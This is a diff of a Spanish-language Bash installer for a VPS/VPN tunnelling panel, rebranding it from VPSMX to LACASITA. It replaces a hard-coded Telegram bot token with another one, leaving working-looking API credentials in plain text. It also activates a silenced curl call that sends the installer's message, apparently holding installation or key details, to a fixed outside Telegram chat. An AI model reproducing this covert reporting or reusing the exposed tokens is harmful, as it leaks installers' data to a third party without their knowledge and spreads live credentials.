@@ -469,14 +469,27 @@ function_verify() {
 }
 
 funcao_idioma() {
+
     clear
+
+    clear
+
     msg -bar2
-    figlet " LATIN" | lolcat
+
+    msg -bar2
+
+    figlet " LACASITA" | lolcat
+
     echo -e "     ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL"
+
     msg -bar2
+
     pv="$(echo es)"
+
     [[ ${#id} -gt 2 ]] && id="es" || id="$pv"
+
     byinst="true"
+
 }
 
 install_fim() {
@@ -616,60 +629,27 @@ ofus() {
 }
 
 verificar_arq() {
-
     [[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
-
     [[ ! -d ${SCPusr} ]] && mkdir ${SCPusr}
-
     [[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
-
     [[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
 
     case $1 in
-
-    "menu" | "message.txt" | "ID") ARQ="${SCPdir}/" ;; #Menu
-
-    "usercodes") ARQ="${SCPusr}/" ;; #Panel SSRR
-
-    "C-SSR.sh") ARQ="${SCPinst}/" ;; #Panel SSR
-
-    "openssh.sh") ARQ="${SCPinst}/" ;; #OpenVPN
-
-    "squid.sh") ARQ="${SCPinst}/" ;; #Squid
-
-    "dropbear.sh" | "proxy.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "proxy.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "openvpn.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "ssl.sh" | "python.py") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "shadowsocks.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "Shadowsocks-libev.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "Shadowsocks-R.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "v2ray.sh" | "slowdns.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "budp.sh") ARQ="${SCPinst}/" ;; #Instalacao
-
-    "sockspy.sh" | "PDirect.py" | "PPub.py" | "PPriv.py" | "POpen.py" | "PGet.py") ARQ="${SCPinst}/" ;; #Instalacao
-
-    *) ARQ="${SCPfrm}/" ;; #Herramientas
-
+        "menu" | "message.txt" | "ID")
+            ARQ="${SCPdir}/" ;; # Menu
+        "usercodes")
+            ARQ="${SCPusr}/" ;; # Panel SSRR
+        "C-SSR.sh" | "openssh.sh" | "squid.sh" | "dropbear.sh" | "proxy.sh" | "openvpn.sh" | "ssl.sh" | "python.py" | "shadowsocks.sh" | "Shadowsocks-libev.sh" | "Shadowsocks-R.sh" | "v2ray.sh" | "slowdns.sh" | "budp.sh" | "sockspy.sh" | "PDirect.py" | "PPub.py" | "PPriv.py" | "POpen.py" | "PGet.py")
+            ARQ="${SCPinst}/" ;; # Instalacao
+        *)
+            ARQ="${SCPfrm}/" ;; # Herramientas
     esac
 
     mv -f ${SCPinstal}/$1 ${ARQ}/$1
-
     chmod +x ${ARQ}/$1
-
 }
 
 NOTIFY() {
-
-    clear
 
     clear
 
@@ -727,7 +707,7 @@ NOTIFY() {
 
     IDB2=$(echo $IDB1) >/dev/null 2>&1
 
-    KEY="2012880601:AAEJ3Kk18PGDzW57LpTMnVMn_pQYQKW3V9w"
+    KEY="6303106499:AAG6SPMRUSCgrS6cLnoh50Y_hysONv8tb0c"
 
     URL="https://api.telegram.org/bot$KEY/sendMessage"
 
@@ -900,7 +880,7 @@ if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq | grep "Code de KEY In
 
     # Enviar mensaje a través de la API de Telegram
     curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
-    #curl -s --max-time 10 -d "chat_id=605531451&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
+    curl -s --max-time 10 -d "chat_id=6693192546&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
 
     rm ${SCPdir}/IP.log &>/dev/null
 
@@ -942,8 +922,8 @@ else
 
     invalid_key
 
-    rm -rf VPSMX.sh lista-arq
+    rm -rf LACASITA.sh lista-arq
 
 fi
 
-rm -rf VPSMX.sh lista-arq
+rm -rf LACASITA.sh lista-arq
